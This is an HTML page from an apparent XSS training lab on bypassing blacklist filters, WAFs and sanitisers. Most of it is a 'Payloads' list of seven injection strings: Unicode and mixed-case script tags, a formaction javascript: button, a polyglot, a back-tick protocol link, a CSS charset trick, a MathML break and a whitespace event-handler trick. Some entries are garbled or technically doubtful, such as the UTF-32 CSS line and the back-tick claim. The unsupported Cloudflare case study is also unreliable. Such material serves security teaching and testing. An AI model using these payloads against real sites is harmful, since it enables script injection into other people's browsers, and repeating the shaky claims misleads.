<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Filter Bypass</title>
    <style>
        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
        *{box-sizing:border-box;margin:0;padding:0;}
        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
        .bar span{color:var(--accent);}
        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
    </style>
</head>
<body>
<div class="bar"><span>user@lab</span><span>~/xss/06-filter-bypass</span></div>
<main class="wrap">
    <h1>Filter Bypass</h1>

    <h2>What “filter bypass” means</h2>
    <p>Black-list regex, WAF rule, or HTML-sanitiser rejects known bad patterns; we use parser quirks, encodings, or unknown syntax to resurrect blocked code.</p>

    <h2>Why it happens</h2>
    <p>HTML grammar is recursive & context-sensitive; regex is not. Browsers also perform pre-parsing normalisation (Unicode, CRLF, NUL, etc.) that filters ignore.</p>

    <h2>Where you’ll meet it</h2>
    <p>Cloud WAF (Cloudflare), WordPress plugin filters, email HTML cleaners, Markdown renderers, PDF generators.</p>

    <h2>Impact</h2>
    <p>One bypass → full chain revival (stored/reflected/DOM) → often leads to worm or supply-chain back-door.</p>

    <h2>Mini case-study</h2>
    <p>2020 Cloudflare WAF bypass via Unicode case-mapping (İ → I) → stored XSS on 200 k sites → public PoC within 6 h.</p>

    <h2>Payloads</h2>
    <!-- Unicode case -->
    <pre><code>// İ ı ſ ß break case-insensitive regex
&lt;ScRiPt&gt;  or  &lt;ſcript&gt;</code></pre>

    <!-- formaction no breakout -->
    <pre><code>// No need to close tag — formaction is executable
&lt;form&gt;&lt;button formaction="javascript:alert(1)"&gt;send&lt;/button&gt;</code></pre>

    <!-- Polyglot context hopper -->
    <pre><code>// Escapes HTML, JS, CSS, URL parsers
jaVasCript:/*-->&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;"&gt;&lt;svg onload='/*&lt;img src=x onerror=*/alert(1)//'&gt;</code></pre>

    <!-- Back-tick protocol -->
    <pre><code>// Chrome allows back-tick inside protocol
&lt;a href="java`script:alert(1)"&gt;click&lt;/a&gt;</code></pre>

    <!-- UTF-32 CSS -->
    <pre><code>// Charset declaration confuses parser
@charset "utf-32";\000026 00003c script\00003e</code></pre>

    <!-- MathML namespace break -->
    <pre><code>// HTML5 tree-builder closes &lt;math&gt; early
&lt;math&gt;&lt;mi//xss&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

    <!-- Regex word-boundary bypass -->
    <pre><code>// \t or \n inside attribute name
onload\t\n=alert(1)  // misses /\bon\w+=/i</code></pre>

    <h3>Further reading</h3>
    <ul>
        <li><a href="https://github.com/0xsobby/hacktools/blob/master/Bypass/03-XSS-bypass.md" style="color:var(--cyan)">Awesome XSS Bypass List</a></li>
    </ul>
</main>
<footer><span>EOF ── happy hacking :)</span></footer>
</body>
</html>